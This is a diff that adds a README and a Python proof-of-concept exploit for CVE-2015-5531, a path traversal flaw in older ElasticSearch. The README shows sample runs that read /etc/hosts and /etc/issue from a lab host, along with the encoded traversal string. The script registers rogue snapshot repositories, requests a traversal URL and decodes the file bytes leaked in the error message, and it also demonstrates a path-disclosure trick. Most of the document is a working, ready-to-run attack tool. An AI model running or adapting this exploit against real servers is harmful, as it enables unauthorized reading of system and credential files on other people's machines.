@@ -1,0 +1,123 @@
+# elasticpwn Script for ElasticSearch url path traversal vuln. CVE-2015-5531
+
+```
+[crg@fogheaven elasticpwn]$ python CVE-2015-5531.py exploitlab.int /etc/hosts
+!dSR script for CVE-2015-5531
+
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+
+
+The script requires path.repo to be set into elasticsearch.yml and be writeable by elasticsearch process.
+
+In order to bypass the snapshot- prefix setted in the server side, we need to create a known relative path:
+
+curl http://exploitlab.int:9200/_snapshot/?pretty
+
+{
+  "pwn" : {
+    "type" : "fs",
+    "settings" : {
+      "location" : "dsr"
+    }
+  },
+  "pwnie" : {
+    "type" : "fs",
+    "settings" : {
+      "location" : "dsr/snapshot-ev1l"
+    }
+  }
+}
+
+We will use it later to access through path traversal url:
+
+trav = 'ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..'
+
+
+The file content it's represented as an array of ints, that needs to be translated into human readable:
+
+crg@exploitlab:~$ python elk-5531.py localhost /etc/issue
+!dSR script for CVE-2015-5531
+
+{u'status': 400, u'error': u'ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=26): [85, 98, 117, 110, 116, 117, 32, 49, 50, 46, 48, 52, 46, 53, 32, 76, 84, 83, 32, 92, 110, 32, 92, 108, 10, 10]]'}
+
+[85, 98, 117, 110, 116, 117, 32, 49, 50, 46, 48, 52, 46, 53, 32, 76, 84, 83, 32, 92, 110, 32, 92, 108, 10, 10] = Ubuntu 12.04.5 LTS \n \l
+
+
+There is also a path disclosure that could help exploiting in some scenarios:
+
+crg@exploitlab:~$ python elk-5531.py localhost /etc/passwda
+!dSR script for CVE-2015-5531
+
+{"error":"SnapshotMissingException[[pwn:dsr/../../../../../../../../etc/passwda] is missing]; nested: FileNotFoundException[/var/tmp/dsr/snapshot-dsr/../../../../../../../../etc/passwda (No such file or directory)]; ","status":404}
+
+```
+
+#!/usr/bin/env python
+# PoC for CVE-2015-5531 - Reported by Benjamin Smith
+# Affects ElasticSearch 1.6.0 and prior
+# Pedro Andujar || twitter: pandujar || email: @segfault.es || @digitalsec.net
+# Jose A. Guasch || twitter: @SecByDefault || jaguasch at gmail.com
+# Tested on default Linux (.deb) install || requires path.repo: to be set on config file
+
+import urllib, urllib2, json, sys, re
+
+print "!dSR script for CVE-2015-5531\n"
+if len(sys.argv) <> 3:
+        print "Ex: %s www.example.com /etc/passwd" % sys.argv[0]
+        sys.exit()
+
+host = sys.argv[1]
+fpath = urllib.quote(sys.argv[2], safe='')
+port = 9200
+trav = 'ev1l%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..' 
+reponame = 'pwn'
+baseurl = "http://%s:%s/_snapshot/" % (host, port)
+xplurl = '%s%s/%s%s' % (baseurl, reponame, trav, fpath)
+
+
+def createSnapdirs():
+	try:
+		url = "%s/%s" % (baseurl, reponame)
+		request = urllib2.Request(url, data='{"type":"fs","settings":{"location":"dsr"}}')
+		request.get_method = lambda: 'POST'
+		urllib2.urlopen(request)
+
+        	url = "%s/%sie" % (baseurl, reponame)
+	        request = urllib2.Request(url, data='{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}')
+	        request.get_method = lambda: 'POST'
+	        urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+                data = json.load(e)
+		print "[!] ERROR: Verify path.repo exist in config file, elasticsearch.yml:\n"
+		print str(data['error'])
+		sys.exit()
+
+
+def grabFile(xplurl):
+	try:
+		urllib2.urlopen(xplurl)
+	except urllib2.HTTPError, e:
+		data = json.load(e)
+		extrdata = re.findall(r'\d+', str(data['error']))
+		decoder = bytearray()
+		for i in extrdata[+2:]:
+			decoder.append(int(i))
+		print decoder
+
+
+def main():
+	createSnapdirs()
+	grabFile(xplurl)
+
+
+if __name__ == "__main__":
+    main()
+
